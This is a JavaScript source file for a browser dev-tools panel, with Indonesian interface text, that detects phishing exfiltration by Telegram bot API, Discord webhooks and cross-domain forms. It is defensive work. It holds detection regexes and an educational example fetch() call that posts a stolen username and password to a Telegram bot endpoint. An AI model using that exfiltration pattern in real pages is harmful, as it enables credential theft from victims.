import Tool from '../DevTools/Tool'
import evalCss from '../lib/evalCss'
import { classPrefix as c } from '../lib/util'
import $ from 'licia/$'
import each from 'licia/each'
import escape from 'licia/escape'
import { copy } from '../Hozin/util'
import { ensureNetPatch, onRequest } from '../Hozin/net'

/* Pola exfiltration yang umum dipakai web phising. */
const TG_RE = /https?:\/\/api\.telegram\.org\/bot(\d+:[A-Za-z0-9_-]{20,})\/([A-Za-z]+)/g
const CHATID_RE = /chat_id["'\s:=(]+(-?\d{4,})/g
const DISCORD_RE = /https?:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/g

function maskToken(t) {
  if (t.length <= 16) return t.slice(0, 6) + '••••' + t.slice(-2)
  return t.slice(0, 12) + '••••' + t.slice(-4)
}

export default class PhishDetector extends Tool {
  constructor() {
    super()
    this._style = evalCss(require('./PhishDetector.scss'))
    this.name = 'phish'
    this._findings = []
    this._blocked = []
    this._live = []
    this._scanning = false
    this._unsub = null
  }
  init($el, container) {
    super.init($el)
    this._container = container
    ensureNetPatch()
    this._unsub = onRequest((entry) => this._onLiveRequest(entry))
    this._render()
    this._bindEvent()
  }
  destroy() {
    if (this._unsub) this._unsub()
    super.destroy()
    evalCss.remove(this._style)
  }
  _onLiveRequest(entry) {
    if (!/api\.telegram\.org/i.test(entry.url || '')) return
    this._live.unshift({ url: entry.url, method: entry.method, time: new Date() })
    if (this._live.length > 20) this._live.pop()
    this._renderLive()
  }
  _render() {
    this._$el.html(
      '<div class="' + c('wrap') + '">' +
        '<div class="' + c('banner') + '">' +
          'Deteksi <b>pasif</b>: tool ini hanya membaca kode & traffic halaman, ' +
          'tidak pernah mengirim request ke Telegram / situs mana pun.' +
        '</div>' +
        '<button class="' + c('scan-btn') + '">Scan halaman</button>' +
        '<div class="' + c('status') + '"></div>' +
        '<div class="' + c('section-title') + '">Pemantauan live (api.telegram.org)</div>' +
        '<div class="' + c('live') + '">' + this._emptyLiveHtml() + '</div>' +
        '<div class="' + c('section-title') + '">Hasil scan</div>' +
        '<div class="' + c('results') + '">' + this._emptyHtml() + '</div>' +
        this._guideHtml() +
        this._eduHtml() +
      '</div>'
    )
  }
  _emptyLiveHtml() {
    return '<div class="' + c('empty') + '">Belum ada request ke api.telegram.org sejak tool dibuka.</div>'
  }
  _emptyHtml() {
    return (
      '<div class="' + c('empty') + '">' +
        'Belum ada hasil. Tekan "Scan halaman" untuk memindai script terhadap ' +
        'pola exfiltration Telegram / Discord / form lintas domain.' +
      '</div>'
    )
  }
  _guideHtml() {
    return (
      '<details class="' + c('edu') + '">' +
        '<summary class="' + c('edu-title') + '">Cara melaporkan bot phising</summary>' +
        '<div class="' + c('edu-body') + '">' +
          '<ol>' +
            '<li>Di Telegram, buka profil bot → menu ⋮ → <b>Laporkan</b>.</li>' +
            '<li>Atau email ke <b>abuse@telegram.org</b> sertakan token &amp; URL situs phising.</li>' +
            '<li>Jangan sebar token ke publik — cukup ke tim abuse Telegram.</li>' +
          '</ol>' +
        '</div>' +
      '</details>'
    )
  }
  _eduHtml() {
    return (
      '<details class="' + c('edu') + '">' +
        '<summary class="' + c('edu-title') + '">Metode &amp; Contoh</summary>' +
        '<div class="' + c('edu-body') + '">' +
          '<p><b>Metodenya:</b> pelaku membuat bot lewat @BotFather lalu menanam ' +
          '<i>bot token</i> langsung di JavaScript halaman phising. Setiap korban ' +
          'mengisi form, datanya dikirim ke ' +
          '<code>https://api.telegram.org/bot&lt;TOKEN&gt;/sendMessage</code> ' +
          'dan mendarat di Telegram pelaku.</p>' +
          '<p><b>Contoh pola yang dideteksi:</b></p>' +
          '<pre><code>fetch("https://api.telegram.org/bot123456:AAHxyz.../sendMessage",\n' +
          '  { method: "POST",\n' +
          '    body: JSON.stringify({ chat_id: "987654321",\n' +
          '      text: "user:" + user + " pass:" + pass }) })</code></pre>' +
          '<p><b>Mitigasi untuk developer:</b> jangan pernah menaruh token bot di ' +
          'kode frontend — selalu lewat backend; pasang Content-Security-Policy ' +
          'yang membatasi <code>connect-src</code>; edukasi user untuk selalu ' +
          'memeriksa URL sebelum login.</p>' +
        '</div>' +
      '</details>'
    )
  }
  _bindEvent() {
    this._$el.on('click', c('.scan-btn'), () => this._scan())
    this._$el.on('click', c('.copy-btn'), (e) => {
      const idx = $(e.currentTarget).data('idx')
      const f = this._findings[idx]
      if (!f || !f.copyValue) return
      copy(f.copyValue)
      this._notify('Disalin ke clipboard')
    })
  }
  _updateStatus(msg) {
    this._$el.find(c('.status')).text(msg)
  }
  _scanText(text, location, seen) {
    let m
    const tg = new RegExp(TG_RE.source, 'g')
    while ((m = tg.exec(text)) !== null) {
      const token = m[1]
      const method = m[2]
      const key = 'tg|' + token
      if (seen[key]) continue
      seen[key] = true
      const chatIds = []
      const cr = new RegExp(CHATID_RE.source, 'g')
      let cm
      while ((cm = cr.exec(text)) !== null) chatIds.push(cm[1])
      this._findings.push({
        kind: 'telegram',
        title: 'Telegram Bot API terdeteksi',
        detail: 'method: ' + method + (chatIds.length ? ' · chat_id: ' + chatIds.slice(0, 3).join(', ') : ''),
        token: maskToken(token),
        location: location,
        copyValue: token,
        danger: true,
      })
    }
    const dc = new RegExp(DISCORD_RE.source, 'g')
    while ((m = dc.exec(text)) !== null) {
      const key = 'dc|' + m[0]
      if (seen[key]) continue
      seen[key] = true
      this._findings.push({
        kind: 'discord',
        title: 'Discord webhook terdeteksi',
        detail: 'webhook id: ' + m[1],
        token: m[0].slice(0, 60) + '…',
        location: location,
        copyValue: m[0],
        danger: true,
      })
    }
  }
  _scanForms() {
    try {
      each(document.querySelectorAll('form'), (form) => {
        const action = form.getAttribute('action')
        if (!action) return
        let actionUrl
        try {
          actionUrl = new URL(action, location.href)
        } catch { return }
        if (actionUrl.origin !== location.origin) {
          this._findings.push({
            kind: 'form',
            title: 'Form submit ke domain lain',
            detail: 'action: ' + actionUrl.href,
            token: '',
            location: 'form' + (form.id ? '#' + form.id : ''),
            copyValue: actionUrl.href,
            danger: false,
          })
        }
      })
    } catch { /* abaikan */ }
  }
  _renderLive() {
    const $live = this._$el.find(c('.live'))
    if (!$live.length) return
    if (this._live.length === 0) {
      $live.html(this._emptyLiveHtml())
      return
    }
    let html = '<div class="' + c('summary') + '">' + this._live.length + ' request tertangkap</div>'
    each(this._live, (l) => {
      html +=
        '<div class="' + c('card') + ' ' + c('card-danger') + '">' +
          '<div class="' + c('pattern') + '">⚠ ' + escape(l.method) + ' → api.telegram.org</div>' +
          '<div class="' + c('location') + '" title="' + escape(l.url) + '">' + escape(l.url) + '</div>' +
        '</div>'
    })
    $live.html(html)
  }
  _renderResults() {
    const $results = this._$el.find(c('.results'))
    let html = ''
    if (this._findings.length === 0) {
      html =
        '<div class="' + c('empty') + '">' +
          'Tidak ada pola exfiltration yang cocok.<br>' +
          'Catatan: hasil nihil ≠ pasti aman — exfil via backend/server ' +
          'tidak terlihat dari sisi browser.' +
        '</div>'
    } else {
      html = '<div class="' + c('summary') + '">' + this._findings.length + ' temuan</div>'
      each(this._findings, (f, i) => {
        html +=
          '<div class="' + c('card') + (f.danger ? ' ' + c('card-danger') : '') + '">' +
            '<div class="' + c('card-head') + '">' +
              '<span class="' + c('pattern') + '">' + escape(f.title) + '</span>' +
              (f.copyValue
                ? '<button class="' + c('copy-btn') + '" data-idx="' + i + '">Copy</button>'
                : '') +
            '</div>' +
            '<div class="' + c('location') + '" title="' + escape(f.location) + '">' +
              escape(f.location) +
            '</div>' +
            (f.token ? '<div class="' + c('value') + '">' + escape(f.token) + '</div>' : '') +
            '<div class="' + c('hint') + '">' + escape(f.detail) + '</div>' +
          '</div>'
      })
    }
    if (this._blocked.length > 0) {
      html += '<div class="' + c('blocked-title') + '">Script eksternal tak terbaca (CORS):</div>'
      each(this._blocked, (b) => {
        html += '<div class="' + c('blocked-item') + '">' + escape(b) + '</div>'
      })
    }
    $results.html(html)
  }
  async _scan() {
    if (this._scanning) return
    this._scanning = true
    this._findings = []
    this._blocked = []
    this._updateStatus('Mengumpulkan script…')
    const externals = []
    const seen = {}
    try {
      each(document.querySelectorAll('script'), (el, i) => {
        const src = el.getAttribute('src')
        if (src) {
          try {
            externals.push(new URL(src, location.href).href)
          } catch { /* abaikan */ }
        } else {
          this._scanText(el.textContent || '', 'inline script #' + (i + 1), seen)
        }
      })
    } catch { /* abaikan */ }
    this._scanForms()
    for (let i = 0; i < externals.length; i++) {
      const url = externals[i]
      this._updateStatus('Memindai script eksternal ' + (i + 1) + '/' + externals.length + '…')
      try {
        const res = await fetch(url)
        if (!res.ok) throw new Error('HTTP ' + res.status)
        const text = await res.text()
        this._scanText(text, url, seen)
      } catch {
        this._blocked.push('terblokir CORS: ' + url)
      }
    }
    this._scanning = false
    this._updateStatus('')
    this._renderResults()
    this._notify('Scan selesai: ' + this._findings.length + ' temuan')
  }
  _notify(msg) {
    this._container.notify(msg, { icon: 'success' })
  }
}
